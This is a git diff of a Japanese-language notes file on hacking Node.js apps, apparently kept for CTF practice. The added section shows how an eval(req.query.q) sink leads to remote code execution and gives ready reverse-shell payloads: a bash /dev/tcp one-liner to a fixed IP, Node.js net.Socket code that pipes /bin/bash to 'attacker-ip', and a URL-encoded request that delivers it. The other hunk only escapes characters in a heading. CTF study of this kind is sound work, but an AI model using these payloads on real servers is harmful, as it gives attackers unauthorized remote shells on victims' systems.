@@ -18,6 +18,23 @@
 - [メモ](#%E3%83%A1%E3%83%A2)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
+# node.js
+## reverse shell
+https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/  
+`eval(req.query.q)`みたいになっている場合、以下でRever shellできる！  
+```txt
+require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/192.168.56.2/80 0>%261"')
+```
+また、以下のようなNode.jsを使ったRever shellもあり。  
+```js
+var net = require("net"), sh = require("child_process").exec("/bin/bash");
+var client = new net.Socket();
+client.connect(80, "attacker-ip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
+sh.stderr.pipe(client);});
+```
+```txt
+http://host-ip:8080/?q=var+net+=+require("net"),+sh+=+require("child_process").exec("/bin/bash");var+client+=+new+net.Socket();client.connect(80,+"attacker-ip",+function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
+```
 # 脆弱なアプリ
 ## Buffer
 https://www.smrrd.de/nodejs-hacking-challenge-writeup.html   
@@ -89,7 +106,7 @@ https://github.com/takabaya-shi/CTF-writeup/blob/master/HackTheBox/celestial/REA
 Vulnhubのtemple of doomでCelestialと同じの逆シリアライズの脆弱性がある。   
 https://github.com/takabaya-shi/CTF-writeup/tree/master/Vulnhub/temple%20of%20doom   
 
-## MySQL "max_allowed_packet"/ PostgreSQL RCE "pg@2.x ~ pg@7.1.0" / (hitcon2017 SQL so Hard)
+## MySQL "max_allowed_packet"/ PostgreSQL RCE "pg\@2.x ~ pg\@7.1.0" / (hitcon2017 SQL so Hard)
 https://github.com/orangetw/My-CTF-Web-Challenges#sql-so-hard  
 https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/sql-so-hard.md  
 配布されるNode.jsの`app.js`は以下の通り。  
